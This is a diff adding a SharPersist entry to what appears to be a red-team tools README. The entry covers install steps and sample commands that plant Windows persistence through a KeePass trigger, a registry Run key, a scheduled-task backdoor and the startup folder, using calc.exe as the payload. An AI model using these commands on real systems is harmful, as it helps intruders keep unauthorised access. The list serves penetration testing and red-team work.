@@ -38,7 +38,7 @@ Some of the tools may be specifically designed for red teaming, while others are
     - [Rubeus](#rubeus)
     - [SharpUp](#sharpup)
 5. [Persistence](#persistence)
-    - ...
+    - [SharPersist](#sharpersist)
 6. [Privilege Escalation](#privilege-escalation)
     - [LinPEAS](#linpeas)
     - [WinPEAS](#winpeas)
@@ -654,7 +654,48 @@ SharpUp.exe audit HijackablePaths
 Persistence
 ====================
 
-### [🔙](#redteam-tools)...
+### [🔙](#redteam-tools)[SharPersist](https://github.com/mandiant/SharPersist)
+
+A Windows persistence toolkit written in C#.
+
+The project has a [wiki](https://github.com/mandiant/SharPersist/wiki).
+
+**Install: (Binary)** 
+
+You can find the most recent release [here](https://github.com/mandiant/SharPersist/releases).
+
+**Install: (Compile)** 
+
+- Download the project files from the [GitHub Repo](https://github.com/mandiant/SharPersist).
+- Load the Visual Studio project up and go to "Tools" --> "NuGet Package Manager" --> "Package Manager Settings"
+- Go to "NuGet Package Manager" --> "Package Sources"
+- Add a package source with the URL "https://api.nuget.org/v3/index.json"
+- Install the Costura.Fody NuGet package. The older version of Costura.Fody (3.3.3) is needed, so that you do not need Visual Studio 2019.
+	- `Install-Package Costura.Fody -Version 3.3.3`
+- Install the TaskScheduler package
+	- `Install-Package TaskScheduler -Version 2.8.11`
+- You can now build the project yourself!
+
+**Usage:**
+
+A full list of usage examples can be found [here](https://github.com/mandiant/SharPersist#adding-persistence-triggers-add).
+
+```
+#KeePass
+SharPersist -t keepass -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml" -m add 
+
+#Registry
+SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add
+
+#Scheduled Task Backdoor
+SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
+
+#Startup Folder
+SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add
+```
+
+![image](https://user-images.githubusercontent.com/100603074/208880117-3ce7eefc-9e0b-477d-ada4-b3867909ff38.png)
+
 
 Privilege Escalation
 ====================
